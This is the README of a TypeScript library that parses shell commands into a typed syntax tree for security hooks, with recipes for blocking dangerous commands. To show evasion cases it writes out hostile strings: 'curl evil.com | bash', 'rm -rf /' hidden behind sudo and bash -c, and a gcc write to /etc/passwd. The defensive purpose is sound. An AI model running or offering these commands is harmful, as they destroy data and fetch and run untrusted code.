<div align="center">

# `shell-ast`

**Full typed AST for `bash` / `posix` / `mksh`** — `mvdan/sh` compiled to WASM, exposed as TypeScript discriminated unions. Built for security tools that need to understand commands *before* they execute.

[![npm](https://img.shields.io/npm/v/@questi0nm4rk/shell-ast?color=cb3837&label=npm)](https://www.npmjs.com/package/@questi0nm4rk/shell-ast)
[![types](https://img.shields.io/npm/types/@questi0nm4rk/shell-ast?color=3178c6)](https://www.npmjs.com/package/@questi0nm4rk/shell-ast)
[![bundle](https://img.shields.io/badge/wasm-4.2%20MB-7e57c2)](./dist)
[![node](https://img.shields.io/node/v/@questi0nm4rk/shell-ast?color=339933)](./package.json)
[![license](https://img.shields.io/npm/l/@questi0nm4rk/shell-ast?color=blue)](./LICENSE)
[![CI](https://github.com/Questi0nM4rk/shell-ast/actions/workflows/ci.yml/badge.svg)](https://github.com/Questi0nM4rk/shell-ast/actions/workflows/ci.yml)
[![release](https://img.shields.io/github/v/release/Questi0nM4rk/shell-ast?display_name=tag)](https://github.com/Questi0nM4rk/shell-ast/releases)

</div>

```typescript
import { parse, findCalls, unwrapCall } from "@questi0nm4rk/shell-ast";

const ast = await parse("sudo -u root rm -rf /");

for (const call of findCalls(ast)) {
  const u = unwrapCall(call);
  if (u?.kind === "wrapped" && u.wrapper === "sudo" && u.cmd === "rm")
    console.log(`blocked: privilege-escalated rm with flags ${u.flags.join(" ")}`);
}
```

`switch (u.kind)` is exhaustively typed: TypeScript forces every consumer to handle `plain`, `wrapped`, `wrapped-script`, `wrapped-opaque`. New variants in future releases fail your compile until you handle them — the library cannot silently drop a case.

---

## Install

```bash
bun add @questi0nm4rk/shell-ast
# or
npm install @questi0nm4rk/shell-ast
```

Ships pre-built WASM in `dist/` (4.2 MB). No Go toolchain needed at install. Works in Node ≥ 18, Bun, and `bun build --compile` standalone binaries — same code, every deployment mode.

> **What's new in 0.7.0** ([plan](./docs/plans/v0.7.0.md)) — `unwrapDeep(call)` and `unwrapDeepParsed(call, parse)` return the wrapper chain for chained invocations like `sudo bash -c 'rm -rf /'` as `UnwrappedCall[]` outermost-first. Closes the asymmetry where `bash -c '…'` auto-recursed via `wrapped-script` but adding `sudo` made the consumer own the recursion. Same logical chain, single migration. Closes [#11](https://github.com/Questi0nM4rk/shell-ast/issues/11), fixes [BUG-008](./docs/BUGS.md).
>
> **What's new in 0.6.0** ([plan](./docs/plans/v0.6.0.md)) — `unwrapCall` is now the complete primary lens. `flagValues` and `innerRaw` land on `UnwrappedCall.wrapped`, so the inner call's value-flags and the synthetic inner `CallExprNode` are reachable directly from `u` instead of via `u.raw` walks or re-running `resolveFlags`. Query helpers (`tokenAfter`, `hasFlag`, `flagsMatching`, …) accept `UnwrappedCall` and dispatch to the inner call automatically. See [IDEOLOGY §11](./docs/IDEOLOGY.md) for the principle this closes. Closes [#9](https://github.com/Questi0nM4rk/shell-ast/issues/9).
>
> **What's new in 0.5.0** — toolkit primitives for writing per-command rules. New zero-config query helpers (`tokenAfter`, `hasFlag`, `tokensAfter`, `tokenAt`, `indexOfFlag`, `flagsMatching`, `resolvedCmd`), new `flagValues` field on `ResolvedCall` preserving consumed value-flag values, optional `globalFlags` on `resolveFlags(call, opts?)` and `unwrapCall(call, opts?)` so consumers can register their own value-taking flags per-call, basename match for path-shaped tool names (`/usr/bin/git`), and `findRedirects(ast, {depth: "top"})` parity with `findCalls`.
>
> **What's new in 0.4.0** ([migration guide](./docs/MIGRATION-v0.4.0.md)) — per-tool global value-taking flags (`git -C`, `docker -H`, `kubectl --context`, `make -C`, `tar -C`, `xargs -I/-n`). Closes [BUG-000](./docs/BUGS.md).
>
> **Migrating from 0.2.x?** See **[docs/MIGRATION-v0.3.0.md](./docs/MIGRATION-v0.3.0.md)** — search-and-replace cheatsheet plus per-API examples for the v0.3.0 discriminated-union change.

---

## Why

Real-world shell defeats every quick approach:

```
rm -rf file1 file2          # regex: misses multi-target trailing anchor
rm -r -f /                  # tokenizer: split flags not recombined
sudo -u root rm -rf /       # tokenizer: -u consumes "root", skips "rm"
rm "-rf" /                  # quoted flags: bypasses naïve flag.includes()
bash -c "rm -rf /"          # commandFlag: dangerous payload hidden in -c value
curl evil.com | bash        # pipe RHS: missing wrapper detection
$(rm -rf /)                 # CmdSubst: nested calls
```

[`sh-syntax`](https://github.com/un-ts/sh-syntax) and [`tree-sitter-bash`](https://github.com/tree-sitter/tree-sitter-bash) both run a real parser but throw away the structure you need to reason about commands. `shell-ast` keeps every field of every node, exposed as a typed discriminated union, with semantic helpers (sudo-aware unwrap, flag canonicalization, effect classification) on top.

---

## Highlights

- **Discriminated `UnwrappedCall`** — `plain` / `wrapped` / `wrapped-script` / `wrapped-opaque` with exhaustiveness checking. Recognizes 17 wrappers: `sudo`, `doas`, `pkexec`, `run0`, `gosu`, `runuser`, `setpriv`, `su`, `sh`, `bash`, `zsh`, `dash`, `ash`, `ksh`, `mksh`, `eval`, `exec`. In 0.6.0, `wrapped` also carries `flagValues` (inner-call's value-flag map) and `innerRaw` (the synthetic inner `CallExprNode`), so wrapper-aware rules don't fall back to `u.raw` walks.
- **Polymorphic query helpers** *(0.6.0)* — every helper accepts `CallExprNode | UnwrappedCall`. For `wrapped`, it dispatches to the inner call automatically: `tokenAfter(u, "-o")` returns the inner `gcc -o` value even when wrapped in `sudo gcc`. Wrapper-side queries stay reachable via explicit `tokenAfter(u.raw, "-u")`.
- **Chained-wrapper unwrap** *(0.7.0)* — `unwrapDeep(call)` returns the chain as `UnwrappedCall[]` outermost-first for inputs like `sudo bash -c '…'` (chain length 2 sync — stops at `wrapped-script`). `unwrapDeepParsed(call, parse)` continues past `wrapped-script` by parsing the inner script (chain length 3 — `wrapped → wrapped-script → plain`). Consumers walk a uniform list regardless of which wrappers compose.
- **Per-tool global value-flag tables** *(0.4.0)* — `git -C /tmp worktree add` parses with `args: ["worktree", "add"]`, not `args: ["/tmp", "worktree", "add"]`. Covers `git`, `docker`, `kubectl`, `make`, `tar`, `xargs`. Sudo / wrapper unwrapping inherits the table on the inner call automatically. Closes [BUG-000](./docs/BUGS.md).
- **Zero-config query helpers** *(new in 0.5.0)* — `tokenAfter(call, "-o")`, `hasFlag(call, "-r")`, `tokensAfter(call, "-c")`, `tokenAt(call, i)`, `indexOfFlag(call, "-C")`, `flagsMatching(call, predicate)`, `resolvedCmd(call)`. Both space form and `=` form handled. The toolkit primitives for hook-kit-style rule authors.
- **`flagValues` on `ResolvedCall`** *(new in 0.5.0)* — captured values for every value-taking flag the resolver recognized, indexed by flag name. Both `--git-dir=/repo` and `--git-dir /repo` populate the same key; repeated flags appear in order.
- **Pluggable `globalFlags`** *(new in 0.5.0)* — `resolveFlags(call, { globalFlags: { terraform: ["-chdir"] } })`. Register your own value-taking flags per-call, merged with the built-in table. No module state.
- **Basename match** *(new in 0.5.0)* — `/usr/bin/git`, `./bin/docker` now hit the right table row. Original path preserved on `cmd`.
- **`DYNAMIC` symbol sentinel** — distinguishes statically-resolvable args from `$variable` / `$(…)` substitutions. Type guards (`isResolved`, `isDynamic`) survive bundler regressions that would silently turn a sentinel into the literal string `"<dynamic>"`.
- **`wordToParts(w)`** — never null; returns `{kind: "literal" | "dynamic", value/sourceText}` fragments. See the partial structure of `rm $DANGER /tmp` instead of getting back `null`.
- **Typed errors** — `ParseSyntaxError` / `ParseSizeError` / `WasmLoadError` / `WasmRuntimeError` with `.kind` discriminator. Catch sites distinguish "user input malformed" from "infra broken."
- **`effectOf(node)` / `effectsOf(node)`** — 13 structural effect kinds (`exec`, `pipe`, `fs-write`, `fs-read`, `fs-rw`, `fd-dup`, `subshell`, `fork-detach`, `capture-exec`, `compound-fs-read`, `compound-fs-write`, `env-write`, `env-prefix`) derived from operator enums. No command-name knowledge required.
- **`findCalls(ast, { depth: "top" })`** — skip data-as-code subtrees (`$(…)`, `<(…)`, `{a,b,c}`) so pipe-rule and inline-shell logic don't need to re-filter.
- **`preloadWasm()`** — idempotent warm-up to move WASM init out of the first-`parse()` hot path.
- **ANSI-C unescape** — `$'\n'` resolves to a real newline. UTF-8 BOM stripped before parse. Multi-part static `Word`s fold (`"foo""bar"` → `"foobar"`).

---

## Quick recipes

### Security hook — block dangerous patterns before execution

```typescript
import { parse, findCalls, unwrapCall } from "@questi0nm4rk/shell-ast";

async function check(input: string): Promise<string | null> {
  const ast = await parse(input).catch(() => null);
  if (!ast) return null;

  for (const call of findCalls(ast)) {
    const u = unwrapCall(call);
    if (!u) continue;

    switch (u.kind) {
      case "plain":
      case "wrapped":
        if (u.cmd === "rm" && u.flags.includes("-r") && u.flags.includes("-f"))
          return `blocked: rm -rf${u.kind === "wrapped" ? ` via ${u.wrapper}` : ""}`;
        if (u.cmd === "git" && u.args[0] === "push" && u.flags.includes("--force"))
          return "blocked: git push --force";
        break;
      case "wrapped-script":
        return await check(u.script); // recurse into bash -c "..."
      case "wrapped-opaque":
        if (u.wrapper === "sudo" || u.wrapper === "doas")
          return `escalation with dynamic inner (${u.wrapper})`;
        break;
    }
  }
  return null;
}
```

### Audit redirects writing outside the workspace

```typescript
import { parse, findRedirects, wordToLit } from "@questi0nm4rk/shell-ast";

const ast = await parse(input);
for (const r of findRedirects(ast, { ops: "write" })) {
  const target = wordToLit(r.word);
  if (target && !target.startsWith("./") && !target.startsWith("/tmp/"))
    console.warn(`writes outside workspace: ${target}`);
}
```

### Trace a pipeline

```typescript
import { parse, findCalls } from "@questi0nm4rk/shell-ast";

const ast = await parse("cat /etc/passwd | grep root | wc -l");
const names = findCalls(ast, { depth: "top" }).map((c) => {
  const part = c.args[0]?.parts[0];
  return part?.type === "Lit" ? part.value : "<dynamic>";
});
// ["cat", "grep", "wc"]
```

### Pre-warm WASM at startup (compiled binaries)

```typescript
import { preloadWasm } from "@questi0nm4rk/shell-ast";

await preloadWasm(); // idempotent; the first parse() is now instant
```

### Per-command rules — primary lens (0.6.0)

shell-ast's defaults are intentionally tool-agnostic. For per-tool nuance, compose the zero-config query helpers against the `UnwrappedCall` directly. The polymorphic helpers handle the sudo/bash/etc. unwrap for you — for `wrapped` variants, every query targets the **inner** call.

```typescript
// "gcc -o must write to /tmp/" — works for plain gcc AND sudo gcc
import { findCalls, parse, tokenAfter, unwrapCall } from "@questi0nm4rk/shell-ast";

const ast = await parse("sudo gcc -o /etc/x.out main.c");
for (const call of findCalls(ast)) {
  const u = unwrapCall(call);
  if (u?.kind !== "plain" && u?.kind !== "wrapped") continue;
  if (u.cmd !== "gcc") continue;
  // u.flagValues works when -o is in the global table (or opts.globalFlags);
  // tokenAfter(u, "-o") is the zero-config fallback. Both target the inner call.
  const out = u.flagValues["-o"]?.[0] ?? tokenAfter(u, "-o");
  if (typeof out === "string" && !out.startsWith("/tmp/"))
    console.warn(`gcc -o ${out} writes outside /tmp`);
}
```

```typescript
// dd's if=/of= syntax — no `-` prefix, no space-separated value
import { findCalls, flagsMatching, parse, unwrapCall } from "@questi0nm4rk/shell-ast";

for (const call of findCalls(await parse(input))) {
  const u = unwrapCall(call);
  if (u?.kind !== "plain" && u?.kind !== "wrapped") continue;
  if (u.cmd !== "dd") continue;
  const writes = flagsMatching(u, (f) => f.startsWith("of=")).map((f) => f.slice(3));
  if (writes.some((t) => !t.startsWith("./"))) deny(`dd of= outside workspace`);
}
```

```typescript
// Register an unknown tool's value-flags per-call — opts threads through unwrap
import { findCalls, parse, unwrapCall } from "@questi0nm4rk/shell-ast";

const ast = await parse("sudo terraform -chdir /tf apply");
for (const call of findCalls(ast)) {
  const u = unwrapCall(call, { globalFlags: { terraform: ["-chdir", "-state"] } });
  if (u?.kind !== "wrapped") continue;
  // u.flagValues = { "-chdir": ["/tf"] }  ← inner terraform's, NOT outer sudo's
  // u.args = ["apply"]
}
```

```typescript
// Native chains work — every extractor returns a real Array
import { findCalls, parse, tokenAfter, unwrapCall } from "@questi0nm4rk/shell-ast";

const ast = await parse(input);
const violations = findCalls(ast)
  .map((c) => unwrapCall(c))
  .filter((u): u is NonNullable<typeof u> => u?.kind === "plain" || u?.kind === "wrapped")
  .filter((u) => u.cmd === "gcc")
  .map((u) => tokenAfter(u, "-o"))
  .filter((o): o is string => typeof o === "string" && !o.startsWith("/tmp/"));
```

`tokenAfter` handles both `--git-dir /repo` and `--git-dir=/repo` forms internally. For wrapper-side queries (e.g. "did sudo escalate to root?"), pass `u.raw` explicitly: `tokenAfter(u.raw, "-u")`.

### Chained wrappers — `unwrapDeep` (0.7.0)

For `sudo bash -c 'rm -rf /'` and similar chained-wrapper invocations, `unwrapCall` peels exactly one layer. The lens classifies `bash -c '…'` as `wrapped-script` (auto-recursed via `unwrapCallParsed`) but `sudo bash -c '…'` as `wrapped`-with-shell-inner — same logical chain, different lens shape. `unwrapDeep` (sync) and `unwrapDeepParsed` (async, re-parses the inner script) return the chain as `UnwrappedCall[]` outermost-first so consumers walk a uniform list.

```typescript
// "is `rm` or `gcc` anywhere in this invocation chain?" — works for sudo bash -c '...' too
import { findCalls, parse, unwrapDeepParsed } from "@questi0nm4rk/shell-ast";

const ast = await parse("sudo bash -c 'gcc -o /etc/passwd src.c'");
for (const call of findCalls(ast)) {
  const chain = await unwrapDeepParsed(call, parse);
  for (const layer of chain) {
    if (layer.kind !== "plain" && layer.kind !== "wrapped") continue;
    if (layer.cmd === "gcc" && layer.flagValues["-o"]?.[0]?.startsWith("/etc/")) {
      console.warn(`gcc writes to system path via chain: ${chain.map((l) => l.cmd ?? l.wrapper).join(" → ")}`);
    }
  }
}
```

`unwrapDeep` stops at the first non-`wrapped` layer (sync can't re-parse). `unwrapDeepParsed` continues past `wrapped-script` and hydrates `innerAst` on that layer. Both cap internally at `MAX_CHAIN_DEPTH = 100` as a defensive runaway guard; consumers should cap on the returned array length per their own policy (hook-kit caps at 5).

---

## Architecture

```
TypeScript (src/)
  parse(src, dialect, options) → ShellFile
  walk(node, visitor) → void
  findCalls / findRedirects / findAssignments / findFunctions / findCmdSubstitutions
  wordToParts / wordToLit / resolveFlags / unwrapCall / unwrapCallParsed
  effectOf / effectsOf
         │
         │  JSON over WASM boundary
         ▼
Go processor (processor/)
  type-switch serializer: every syntax.Node → typed JSON
         │
         │  uses
         ▼
mvdan/sh v3 (vendored)
  industry-standard shell parser (also used by shfmt, dprint, Hugo)
```

The Go layer is intentionally minimal (~800 lines) — its only job is to expose every `syntax.Node` field across the WASM boundary. The TypeScript layer adds the typed surface, semantic helpers, and the discriminator-driven contracts that make consumer policy easy to write.

---

## Compared to

|  | `sh-syntax` | `tree-sitter-bash` | **`shell-ast`** |
|---|---|---|---|
| Parser | mvdan/sh v3 | tree-sitter | mvdan/sh v3 |
| AST exposed | Positions only | Generic `{type, children}` | **Full typed tree** |
| TypeScript types | `{Pos, End}` | Untyped nodes | **Discriminated union** |
| Wrapper unwrap (sudo / bash -c / …) | ✗ | ✗ | **✓ (17 wrappers)** |
| Flag canonicalization (`-rf` → `[-r, -f]`) | ✗ | ✗ | **✓** |
| Effect classification | ✗ | ✗ | **✓ (13 kinds)** |
| POSIX / mksh dialects | ✓ | partial | **✓** |
| Quoted-flag bypass (`rm "-rf"` ≡ `rm -rf`) | ✗ | ✗ | **✓** |
| Compiled-binary support (`bun build --compile`) | broken | partial | **✓** |

---

## Quality bar

- **351 TypeScript tests** + **52 Go tests** + **44-case schema completeness lock** + continuous fuzz of the serializer in CI
- **Two regression smokes** baked into CI — compiled-binary deployment ([gh #5](https://github.com/Questi0nM4rk/shell-ast/issues/5)), consumer install from-elsewhere ([BUG-001](./docs/BUGS.md))
- **No process execution at the test surface** — CI greps the source tree for `child_process` / `node:child_process` / `worker_threads` / `node:worker_threads` / `node:vm` / `execSync` / `spawnSync` / `Bun.spawn` / `Deno.run` / `Deno.Command` and fails the build on any match. The library parses shell strings; the test suite must never run them.
- **Dependabot-tracked** for Go, npm, and GitHub Actions ecosystems

---

## Compatibility

| Runtime | Status |
|---|---|
| Node.js ≥ 18 | ✓ ESM only (this package is `"type": "module"`) |
| Bun ≥ 1.3 | ✓ |
| `bun build --compile` standalone binary | ✓ — verified by CI smoke test ([gh #5](https://github.com/Questi0nM4rk/shell-ast/issues/5)) |
| Deno | should work via `npm:` specifier; not in CI |
| Browsers | not supported (uses Node WASI shim) |

---

## Docs

- [**docs/IDEOLOGY.md**](./docs/IDEOLOGY.md) — ecosystem philosophy: where shell-ast stops, what hook-kit / ai-guardrails / feets own, what we explicitly do NOT do and why
- [**docs/plans/v0.7.0.md**](./docs/plans/v0.7.0.md) — what was added in 0.7.0 and why (chained-wrapper unwrap — `unwrapDeep` / `unwrapDeepParsed`, closes BUG-008)
- [**docs/plans/v0.6.0.md**](./docs/plans/v0.6.0.md) — what was added in 0.6.0 and why (primary-lens completeness — `flagValues` + `innerRaw` on `UnwrappedCall`, polymorphic query helpers)
- [**docs/plans/v0.5.0.md**](./docs/plans/v0.5.0.md) — what was added in 0.5.0 and why (toolkit primitives, no per-tool semantics in shell-ast)
- [**docs/MIGRATION-v0.4.0.md**](./docs/MIGRATION-v0.4.0.md) — what changed in 0.4.0 (per-tool global flag tables) and how to update consumer code
- [**docs/MIGRATION-v0.3.0.md**](./docs/MIGRATION-v0.3.0.md) — search-and-replace cheatsheet + per-API examples for v0.2.x consumers
- [**docs/BUGS.md**](./docs/BUGS.md) — consumer-pain log; each entry cites the consumer file:line where friction shows up
- [**docs/decisions/codebase-audit-v0.4.0.md**](./docs/decisions/codebase-audit-v0.4.0.md) — internal codebase audit history (resolved v0.4.0)
- [**docs/specs/**](./docs/specs/) — design specs (development archaeology; not required reading)

---

## Development

Prerequisites: Go ≥ 1.25, Bun ≥ 1.3, TypeScript 6 (installed as a devDependency).

```bash
git clone https://github.com/Questi0nM4rk/shell-ast
cd shell-ast
bun install
bun run build      # build wasm + bundle ts
bun test           # run the TypeScript suite
go test ./processor/...    # 52 Go tests + 44-case schema lock
```

`bun run prepublishOnly` runs the full release gate: `lint → typecheck → go test → bun test → build`.

### Releasing

Releases are cut manually — there is no auto-publish workflow. To ship a new version:

```bash
bun run prepublishOnly         # run the full gate locally
npm version patch              # or minor / major; bumps package.json + tag
npm publish                    # publishConfig.access is already "public"
git push --follow-tags
```

`publishConfig.access` is set to `"public"` so the scoped package will not be silently rejected as private. Provenance attestations are off by default; turn them on per-publish with `npm publish --provenance` if running from CI with `id-token: write`.

---

## License

MIT. Based on [`un-ts/sh-syntax`](https://github.com/un-ts/sh-syntax) (also MIT), itself a fork of [`mvdan/sh`](https://github.com/mvdan/sh) (BSD-3).
